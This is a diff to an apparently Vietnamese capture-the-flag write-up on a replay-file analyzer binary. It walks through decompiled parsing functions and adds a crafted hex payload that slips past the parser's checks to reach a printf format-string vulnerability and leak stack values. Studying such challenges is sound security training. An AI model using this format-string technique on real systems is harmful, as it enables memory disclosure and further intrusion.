@@ -92,7 +92,7 @@ __int64 __fastcall read_byte(_QWORD *pointerofbuff, _QWORD *size)
  consume_bytes(&pointerofbuff, &size, 4);
 ```
 với hàm này cũng có cơ chế tương tự read_bytes nhưng mà ta có thể thay đổi số bytes, số bytes đó sẽ giảm size xuống và tăng giá trị của pointerofbuff theo số bytes đó 
-- thông qua các cơ chế trên thì ta có thể nhập bytes cho phù hợp để vượt qua các hàm trên
+- thông qua các cơ chế trên thì ta có thể nhập bytes cho phù hợp để vượt qua các hàm trên thông qua việc nhập ký tự là 8 bytes a đầu, chủ yếu là các hàm read_bytes và consume_bytes
 ```c
 puts("Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):");
     buff = 0LL;
@@ -130,4 +130,76 @@ puts("Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):");
       puts("Mode: osu!");
     }
     consume_bytes(&pointerofbuff, &size, 4);
+```
+- để có thể vượt qua hàm read_string thì ta phải nhập thêm 2 bytes a nữa cộng thêm bytes 0b
+```c
+ result = (_BYTE *)read_byte(buff, size);
+  if ( (_BYTE)result )
+  {
+    if ( (_BYTE)result != 0xB )
+    {
+      puts("Error: failed to read string");
+      exit(1);
+    }
+```
+- để vượt các vòng lặp dưới nữa của hàm nàyvà có thể điều khiển số bytes nhập vào biến format ta có thể cộng thêm chuỗi nhập vào ban đầu là số nhưng phải bao gồm 2 chữ số
+```c
+   v10 = 0;
+    for ( i = 0; ; i += 7 )
+    {
+      byte = read_byte(buff, size);
+      v10 |= (byte & 127) << i;
+      if ( byte >= 0 )
+        break;
+    }
+    for ( j = 0; ; ++j )
+    {
+      v6 = a4;
+      if ( a4 > v10 )
+        v6 = v10;
+      if ( v6 <= j )
+        break;
+      a3[j] = read_byte(buff, size);
+    }
+    while ( v10 > j )
+```
+- đây chính là nơi mà tạo ra size cho việc nhập format
+```c
+byte = read_byte(buff, size);
+      v10 |= (byte & 127) << i;
+
+```
+```c
+  read_string(&pointerofbuff, &size, format, '\xFF');
+    printf("Hash: %s\n", format);
+    read_string(&pointerofbuff, &size, format, 0xFFu);
+    printf("Player name: ");
+    printf(format);
+```
+- ở trong payload sẽ bao gồm việc vượt qua các hàm trên để đến được formatstring
+```python
+b'a'*10 +  b'0b' +b'08' + b'aabaaaaaabaaaaaa' + b'0b' + b'08' +  b'2535312470000000'
+```
+- format string sẽ được dịch lại tương tự như cách dịch của hàm hexs2bin
+```c
+read_string(&pointerofbuff, &size, format, '\xFF');
+    printf("Hash: %s\n", format);
+    read_string(&pointerofbuff, &size, format, 0xFFu);
+    printf("Player name: ");
+    printf(format);
+    putchar(10);
+    read_string(&pointerofbuff, &size, format, 0xFFu);
+    consume_bytes(&pointerofbuff, &size, 10);
+    v6 = read_short(&pointerofbuff, &size);
+    printf("Miss count: %d\n", v6);
+    if ( v6 )
+      puts("Yep, looks like you missed.");
+    else
+      puts("You didn't miss!");
+    puts("=~=~=~=~=~=~=~=~=~=~=\n");
+    free(buff);
+    free(pointerofbuff);
+  }
+  return 0;
+}
 ```
